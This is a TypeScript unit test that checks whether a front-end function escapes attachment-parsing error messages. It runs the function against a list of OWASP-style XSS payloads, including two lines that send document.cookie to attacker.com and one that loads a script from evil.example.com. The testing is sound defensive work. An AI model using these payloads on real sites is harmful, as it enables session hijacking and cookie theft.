import assert from 'node:assert/strict'
import test from 'node:test'
import { DOMParser } from '@xmldom/xmldom'

import { getAttachmentParsingSummaryHtml } from './attachmentParsingDisplay.ts'

const mockT = (key: string, _params?: Record<string, unknown>) => {
  return key
}

// Comprehensive OWASP XSS payload attack suite
const XSS_PAYLOADS = [
  // 1. Classic script tag variations
  '<script>alert(1)</script>',
  '<SCRIPT SRC="https://evil.example.com/xss.js"></SCRIPT>',
  '<<SCRIPT>alert("XSS");//<</SCRIPT>',
  '<script\x20type="text/javascript">javascript:alert(1);</script>',
  '<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>',

  // 2. Image, SVG, and multimedia event handlers
  '<img src="x" onerror="alert(document.cookie)">',
  '<IMG SRC="javascript:alert(\'XSS\')">',
  '<img src=x onerror=this.src=\'http://attacker.com/?c=\'+document.cookie>',
  '<svg onload="alert(1)">',
  '<svg/onload=alert(String.fromCharCode(88,83,83))>',
  '<svg><script>alert(1)</script></svg>',
  '<body onload="alert(1)">',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>',
  '<input type="image" src="x" onerror="alert(1)">',
  '<audio src="x" onerror="alert(1)">',
  '<video><source onerror="alert(1)">',
  '<details open ontoggle="alert(1)"><summary>test</summary></details>',
  '<marquee onstart="alert(1)">test</marquee>',

  // 3. Attribute breakout and quotation tricks
  '"><script>alert(1)</script>',
  '\' onfocus=\'alert(1)\' autofocus=\'',
  '"><img src=x onerror=alert(1)>',
  '"><svg onload=alert(1)>',
  '<a href="javascript:alert(1)">click me</a>',

  // 4. Prefix variations (as returned by docreader or backend)
  '附件解析失败: <script>alert(1)</script>',
  '附件解析失败: <img src=x onerror=alert(1)>',
  '附件解析失败:   \t\n  <iframe src="javascript:alert(1)">',

  // 5. Entity evasion & Unicode
  '&lt;script&gt;alert(1)&lt;/script&gt;',
  '&#60;script&#62;alert(1)&#60;/script&#62;',
  '<scr\x00ipt>alert(1)</script>',
  '＜script＞alert(1)＜/script＞',
]

test('FE-01: getAttachmentParsingSummaryHtml neutralizes all OWASP XSS payloads', () => {
  const domParser = new DOMParser()

  for (const payload of XSS_PAYLOADS) {
    const html = getAttachmentParsingSummaryHtml(mockT as any, {
      success: false,
      error: payload,
    })

    // 1. Literal unescaped HTML opening tag brackets (<tag) must NEVER exist
    assert.doesNotMatch(html, /<[a-z!/]/i, `Payload must not contain raw opening tag brackets: ${payload}`)

    // 2. When wrapped in simulated container div (simulating Vue v-html), parse as DOM
    // In XML/HTML DOM, parsed tags inside <div> would create child Elements.
    // Because everything is escaped (&lt; etc.), there must be ZERO child element nodes created!
    const containerXml = `<div class="results-summary-text">${html}</div>`
    const doc = domParser.parseFromString(containerXml, 'text/html')
    
    // There should be no script, img, svg, iframe, or audio/video child elements
    assert.equal(doc.getElementsByTagName('script').length, 0, `No script elements allowed for: ${payload}`)
    assert.equal(doc.getElementsByTagName('img').length, 0, `No img elements allowed for: ${payload}`)
    assert.equal(doc.getElementsByTagName('svg').length, 0, `No svg elements allowed for: ${payload}`)
    assert.equal(doc.getElementsByTagName('iframe').length, 0, `No iframe elements allowed for: ${payload}`)
    assert.equal(doc.getElementsByTagName('input').length, 0, `No input elements allowed for: ${payload}`)
    assert.equal(doc.getElementsByTagName('details').length, 0, `No details elements allowed for: ${payload}`)
    assert.equal(doc.getElementsByTagName('a').length, 0, `No anchor elements allowed for: ${payload}`)

  }
})

test('FE-01: Output field fallback is also properly escaped', () => {
  const html = getAttachmentParsingSummaryHtml(mockT as any, {
    success: false,
    output: '<script>alert("from_output")</script>',
  })
  assert.equal(html, '&lt;script&gt;alert(&quot;from_output&quot;)&lt;/script&gt;')
})

test('FE-01: Legitimate error messages remain readable without false corruption', () => {
  const normalError = '附件解析失败: 无法识别的文件扩展名 .xyz'
  const html = getAttachmentParsingSummaryHtml(mockT as any, {
    success: false,
    error: normalError,
  })
  assert.equal(html, '无法识别的文件扩展名 .xyz')
})
